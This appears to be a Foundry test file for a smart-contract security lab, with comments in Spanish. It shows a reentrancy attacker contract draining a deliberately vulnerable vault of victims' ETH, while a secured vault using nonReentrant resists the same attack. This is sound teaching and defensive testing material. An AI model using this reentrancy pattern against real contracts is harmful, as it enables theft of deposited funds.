// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/vulnerable/VulnerableVault.sol";
import "../contracts/secure/SecureVault.sol";
import "../contracts/Attacker.sol";

/// @title SecureVaultAttacker - Intenta el mismo ataque contra SecureVault
/// @dev Deberia fallar porque SecureVault tiene nonReentrant + CEI
contract SecureVaultAttacker {
    SecureVault public vault;
    address public owner;
    uint256 public reentryCalls;

    constructor(address _vault) {
        vault = SecureVault(payable(_vault));
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        reentryCalls++;
        if (address(vault).balance > 0) {
            // Intentar re-entrar - esto deberia fallar
            try vault.withdraw() {} catch {}
        }
    }

    function collect() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}

/// @title ReentrancyAttackTest
/// @notice Tests que demuestran:
///         1. El ataque de reentrancy exitoso contra VulnerableVault
///         2. El mismo ataque fallando contra SecureVault
contract ReentrancyAttackTest is Test {
    VulnerableVault public vulnerableVault;
    SecureVault public secureVault;

    address public victim1;
    address public victim2;
    address public attackerEOA;

    uint256 constant VICTIM_DEPOSIT = 10 ether;
    uint256 constant ATTACKER_DEPOSIT = 1 ether;

    function setUp() public {
        // Crear cuentas
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");
        attackerEOA = makeAddr("attacker");

        // Fondear cuentas
        vm.deal(victim1, VICTIM_DEPOSIT);
        vm.deal(victim2, VICTIM_DEPOSIT);
        vm.deal(attackerEOA, ATTACKER_DEPOSIT);

        // Deploy vaults
        vulnerableVault = new VulnerableVault();
        secureVault = new SecureVault();

        // Victimas depositan en ambos vaults
        vm.prank(victim1);
        vulnerableVault.deposit{value: VICTIM_DEPOSIT}();

        vm.prank(victim2);
        vulnerableVault.deposit{value: VICTIM_DEPOSIT}();

        vm.prank(victim1);
        secureVault.deposit{value: VICTIM_DEPOSIT}();

        vm.prank(victim2);
        secureVault.deposit{value: VICTIM_DEPOSIT}();
    }

    // =========================================================================
    // Tests contra VulnerableVault (ataque exitoso)
    // =========================================================================

    function test_VulnerableVault_HasFunds() public view {
        assertEq(vulnerableVault.getBalance(), 2 * VICTIM_DEPOSIT);
    }

    function test_VulnerableVault_ReentrancyAttackDrainsVault() public {
        // Estado inicial
        uint256 vaultBalanceBefore = vulnerableVault.getBalance();
        assertEq(vaultBalanceBefore, 20 ether);

        // Deploy attacker contract
        vm.startPrank(attackerEOA);
        Attacker attacker = new Attacker(address(vulnerableVault));

        // Ejecutar ataque con 1 ETH
        attacker.attack{value: ATTACKER_DEPOSIT}();
        vm.stopPrank();

        // El vault deberia estar vacio (drenado)
        assertEq(vulnerableVault.getBalance(), 0, "Vault should be drained");

        // El atacante deberia tener todo el ETH (20 ETH de victimas + 1 ETH propio)
        assertEq(
            address(attacker).balance,
            vaultBalanceBefore + ATTACKER_DEPOSIT,
            "Attacker should have all the ETH"
        );
    }

    function test_VulnerableVault_VictimsLoseEverything() public {
        // Ejecutar ataque
        vm.startPrank(attackerEOA);
        Attacker attacker = new Attacker(address(vulnerableVault));
        attacker.attack{value: ATTACKER_DEPOSIT}();
        vm.stopPrank();

        // Las victimas ya no pueden retirar sus fondos
        vm.prank(victim1);
        vm.expectRevert("No balance");
        vulnerableVault.withdraw();
    }

    // =========================================================================
    // Tests contra SecureVault (ataque fallido)
    // =========================================================================

    function test_SecureVault_HasFunds() public view {
        assertEq(secureVault.getBalance(), 2 * VICTIM_DEPOSIT);
    }

    function test_SecureVault_ResistsReentrancyAttack() public {
        uint256 vaultBalanceBefore = secureVault.getBalance();

        // Deploy attacker contra secure vault
        vm.startPrank(attackerEOA);
        SecureVaultAttacker attacker = new SecureVaultAttacker(address(secureVault));

        // Ejecutar ataque
        attacker.attack{value: ATTACKER_DEPOSIT}();
        vm.stopPrank();

        // El atacante solo pudo retirar su propio deposito (1 ETH), no mas
        assertEq(
            address(attacker).balance,
            ATTACKER_DEPOSIT,
            "Attacker should only get their own deposit back"
        );

        // El vault aun tiene los fondos de las victimas
        assertEq(
            secureVault.getBalance(),
            vaultBalanceBefore,
            "Vault should still have victims' funds"
        );
    }

    function test_SecureVault_VictimsCanStillWithdraw() public {
        // Ejecutar ataque fallido
        vm.startPrank(attackerEOA);
        SecureVaultAttacker attacker = new SecureVaultAttacker(address(secureVault));
        attacker.attack{value: ATTACKER_DEPOSIT}();
        vm.stopPrank();

        // Las victimas aun pueden retirar
        uint256 victim1BalanceBefore = victim1.balance;

        vm.prank(victim1);
        secureVault.withdraw();

        assertEq(
            victim1.balance,
            victim1BalanceBefore + VICTIM_DEPOSIT,
            "Victim1 should withdraw their full deposit"
        );
    }

    function test_SecureVault_NormalWithdrawWorks() public {
        uint256 victim1BalanceBefore = victim1.balance;

        vm.prank(victim1);
        secureVault.withdraw();

        assertEq(victim1.balance, victim1BalanceBefore + VICTIM_DEPOSIT);
        assertEq(secureVault.balances(victim1), 0);
    }
}
